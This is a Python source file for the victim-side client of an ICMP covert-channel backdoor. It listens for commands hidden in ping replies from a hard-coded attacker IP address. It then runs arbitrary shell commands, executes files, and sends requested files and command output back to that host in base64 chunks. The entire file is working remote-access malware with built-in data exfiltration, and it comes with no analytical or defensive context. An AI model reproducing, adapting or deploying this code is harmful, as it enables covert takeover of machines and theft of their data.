import os
import base64
import subprocess
from scapy.all import IP, ICMP, Raw, send, sniff

ATTACKER_IP = "3.253.124.18"
FILE_CHUNK_SIZE = 1400  # Максимальный размер полезной нагрузки ICMP пакета


def send_response(data):
    """Send response to attacker (always base64, split into chunks)."""
    try:
        # Если data — это bytes, не перекодируем заново
        if isinstance(data, bytes):
            data_b64 = base64.b64encode(data)
        else:
            data_b64 = base64.b64encode(str(data).encode('utf-8'))

        for i in range(0, len(data_b64), FILE_CHUNK_SIZE):
            chunk = data_b64[i:i + FILE_CHUNK_SIZE]
            icmp_packet = IP(dst=ATTACKER_IP) / ICMP(type=0) / Raw(load=chunk)
            send(icmp_packet, verbose=0)

        # End-of-transmission marker
        end_packet = IP(dst=ATTACKER_IP) / ICMP(type=0) / Raw(load=b"END_OF_FILE")
        send(end_packet, verbose=0)
        print("[+] Response sent to attacker.")
    except Exception as e:
        print(f"[-] Error while sending response: {e}")


def handle_command(packet):
    """Process incoming commands."""
    try:
        command = packet[Raw].load.decode().strip()
        print(f"[*] Received command: '{command}'")

        # Send file
        if command.startswith("send_file "):
            filename = command.split(" ", 1)[1]
            if os.path.isfile(filename):
                with open(filename, "rb") as f:
                    file_data = f.read()
                send_response(file_data)
                print(f"[+] File '{filename}' sent.")
            else:
                send_response(f"File '{filename}' not found.")

        # Run file
        elif command.startswith("run_file "):
            filepath = command.split(" ", 1)[1]
            if os.path.exists(filepath):
                subprocess.Popen(filepath, shell=True)
                send_response(f"File '{filepath}' executed.")
            else:
                send_response(f"File '{filepath}' not found.")

        # All other commands
        elif command:
            try:
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                send_response(result)
                print(f"[*] Sent result: '{result.strip()}'")

            except subprocess.CalledProcessError as e:
                send_response(e.output)
                print("[*] Sent error output")

    except Exception as e:
        send_response(f"[-] Command execution error: {e}")


if __name__ == "__main__":
    print("[*] Victim client started. Waiting for ICMP commands...")
    sniff(
        filter=f"icmp and host {ATTACKER_IP} and icmp[icmptype] = 0",
        prn=handle_command,
        store=False
    )
